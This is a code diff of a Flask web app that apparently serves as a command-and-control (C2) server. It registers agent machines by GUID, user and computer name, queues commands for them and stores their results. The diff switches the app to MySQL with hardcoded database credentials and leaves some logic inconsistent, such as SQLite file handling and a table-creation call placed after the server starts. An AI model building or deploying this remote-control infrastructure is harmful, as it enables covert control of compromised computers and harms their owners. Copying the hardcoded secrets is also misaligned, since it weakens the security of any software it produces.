@@ -1,54 +1,63 @@
-import base64, os
-import logging
-from flask import Flask, render_template, request, url_for, redirect
-from flask_sqlalchemy import SQLAlchemy
 from sqlalchemy import desc, func
+from flask_sqlalchemy import SQLAlchemy
+from flaskext.mysql import MySQL
+from flask import Flask, render_template, request, url_for, redirect
+import base64
+import os
+import logging
 
 app = Flask(__name__)
 
-logging.basicConfig(filename='sharklog.log',level=logging.INFO)
+logging.basicConfig(filename='sharklog.log', level=logging.INFO)
 
 
 if os.path.exists('database/c2.db'):
     pass
 else:
     os.mknod("database/c2.db")
-    
-app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database/c2.db'
+
+username = "pogChamp"
+password = "BestC2Ever"
+server = "localhost"
+
+app.config["SQLALCHEMY_DATABASE_URI"] = "mysql+mysqlconnector://{}:{}@{}/c2".format(
+    username, password, server)
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 app.config['TEMPLATES_AUTO_RELOAD'] = True
 
+
 db = SQLAlchemy(app)
+
 password = 'b4bysh4rk'
 
 
-def main():    
+def main():
     size_db = os.path.getsize("database/c2.db")
     logging.debug('Size file database: {}'.format(size_db))
-    if size_db <= 10:
-        instruct()
 
 
 class Command(db.Model):
 
     id = db.Column(db.Integer, primary_key=True)
-    cmd = db.Column(db.String)
+    cmd = db.Column(db.String(4096))
     done = db.Column(db.Boolean)
     logging.debug('Table: command, columns: {}, {}, {}'.format(id, cmd, done))
 
 
 class Results(db.Model):
-    
+
     id = db.Column(db.Integer, primary_key=True)
-    results = db.Column(db.String)
+    results = db.Column(db.String(4096))
     logging.debug('Table: results, columns: {}, {}'.format(id, results))
 
+
 class Agents(db.Model):
-    
-    guid = db.Column(db.String, primary_key=True)
-    user = db.Column(db.String)
-    computer = db.Column(db.String)
-    logging.debug('Table: results, columns: {}, {}'.format(id, results))
+
+    guid = db.Column(db.String(64), primary_key=True)
+    user = db.Column(db.String(256))
+    computer = db.Column(db.String(256))
+    logging.debug('Table: guid, columns: {}, {}, {}'.format(
+        guid, user, computer))
 
 
 @app.route('/')
@@ -66,14 +75,15 @@ def home():
         else:
             return render_template('redir.html')
 
+
 @app.route('/register')
 def register():
     guid = request.args.get('guid')
     user = request.args.get('user')
     computer = request.args.get('computer')
-    save_agent = Agents(guid = guid, user=user, computer=computer)
+    save_agent = Agents(guid=guid, user=user, computer=computer)
     db.session.add(save_agent)
-    db.session.commit() 
+    db.session.commit()
     return render_template('register.html')
 
 
@@ -111,10 +121,10 @@ def create():
 
 
 @app.route('/done/<id>')
-def done(id):#marks the command "done" in the sql database
+def done(id):  # marks the command "done" in the sql database
     if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
         task = Command.query.filter_by(id=int(id)).first()
-        task.done = not task.done 
+        task.done = not task.done
         db.session.commit()
         return redirect(url_for('home'))
     else:
@@ -127,6 +137,8 @@ def delete(id):
     db.session.commit()
     return redirect(url_for('home'))
 
+
 if __name__ == '__main__':
     main()
     app.run(debug=False)
+    db.create_all()
